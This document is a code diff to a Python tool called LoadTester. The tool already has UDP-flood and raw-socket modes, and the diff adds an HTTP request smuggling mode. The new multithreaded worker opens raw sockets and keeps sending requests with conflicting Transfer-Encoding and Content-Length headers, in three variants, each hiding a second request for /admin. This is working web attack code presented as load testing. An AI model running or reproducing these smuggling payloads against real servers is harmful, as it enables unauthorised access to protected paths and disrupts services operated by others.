@@ -53,6 +53,7 @@ class LoadTester:
         tls_cipher=None,
         udp_flood=False,
         raw_socket=False,
+        http_smuggling=None,
     ):
         if config:
             with open(config, "r") as f:
@@ -77,6 +78,7 @@ class LoadTester:
                 tls_cipher = cfg.get("tls_cipher", tls_cipher)
                 udp_flood = cfg.get("udp_flood", udp_flood)
                 raw_socket = cfg.get("raw_socket", raw_socket)
+                http_smuggling = cfg.get("http_smuggling", http_smuggling)
                 rps = cfg.get("rps", rps)
                 client_cert = cfg.get("client_cert", client_cert)
                 client_key = cfg.get("client_key", client_key)
@@ -114,6 +116,7 @@ class LoadTester:
         self.tls_cipher = tls_cipher
         self.udp_flood = udp_flood
         self.raw_socket = raw_socket
+        self.http_smuggling = http_smuggling
         self.results = {"success": 0, "failed": 0, "response_times": [], "errors": {}}
         self.lock = threading.Lock()
         self.running = True
@@ -178,6 +181,68 @@ class LoadTester:
                 sock.close()
                 with self.lock:
                     self.results["success"] += 1
+            except Exception as e:
+                with self.lock:
+                    self.results["failed"] += 1
+                    self.results["errors"][str(type(e).__name__)] = (
+                        self.results["errors"].get(str(type(e).__name__), 0) + 1
+                    )
+
+    def smuggling_worker(self):
+        try:
+            parsed = httpx.URL(self.url)
+            host = parsed.host
+            port = parsed.port or 80
+            path = parsed.path or "/"
+        except:
+            return
+
+        while self.running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                sock.connect((host, port))
+
+                if self.http_smuggling == "te-cl":
+                    req = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {host}\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"Content-Length: 10\r\n"
+                        f"\r\n"
+                        f"0\r\n\r\n"
+                        f"GET /admin HTTP/1.1\r\n"
+                        f"Host: {host}\r\n\r\n"
+                    )
+                elif self.http_smuggling == "cl-te":
+                    req = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {host}\r\n"
+                        f"Content-Length: 3\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"\r\n"
+                        f"GET /admin HTTP/1.1\r\n"
+                        f"Host: {host}\r\n\r\n"
+                    )
+                elif self.http_smuggling == "te-content":
+                    req = (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {host}\r\n"
+                        f"Transfer-Encoding: chunked\r\n"
+                        f"\r\n"
+                        f"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
+                    )
+                else:
+                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
+
+                sock.send(req.encode())
+                resp = sock.recv(4096)
+                sock.close()
+
+                with self.lock:
+                    self.results["success"] += 1
+                    self.results["response_times"].append(0)
+
             except Exception as e:
                 with self.lock:
                     self.results["failed"] += 1
@@ -659,6 +724,8 @@ class LoadTester:
             print(f"    UDP Flood: enabled")
         if self.raw_socket:
             print(f"    Raw Socket: enabled")
+        if self.http_smuggling:
+            print(f"    HTTP Smuggling: {self.http_smuggling}")
 
         start_time = time.time()
 
@@ -678,6 +745,18 @@ class LoadTester:
             threads = []
             for _ in range(self.concurrency):
                 t = threading.Thread(target=self.raw_tcp_worker)
+                t.start()
+                threads.append(t)
+
+            time.sleep(self.total_requests / 100)
+
+            self.running = False
+            for t in threads:
+                t.join()
+        elif self.http_smuggling:
+            threads = []
+            for _ in range(self.concurrency):
+                t = threading.Thread(target=self.smuggling_worker)
                 t.start()
                 threads.append(t)
 
@@ -1002,6 +1081,11 @@ def main():
         action="store_true",
         help="Raw TCP socket mode (direct connection)",
     )
+    parser.add_argument(
+        "--http-smuggling",
+        choices=["te-cl", "cl-te", "te-content"],
+        help="HTTP request smuggling: te-cl (TEO+CL), cl-te (CL+TEO), te-content",
+    )
 
     args = parser.parse_args()
 
@@ -1041,6 +1125,7 @@ def main():
         tls_cipher=args.tls_cipher,
         udp_flood=args.udp_flood,
         raw_socket=args.raw_socket,
+        http_smuggling=args.http_smuggling,
     )
     tester.run()
 
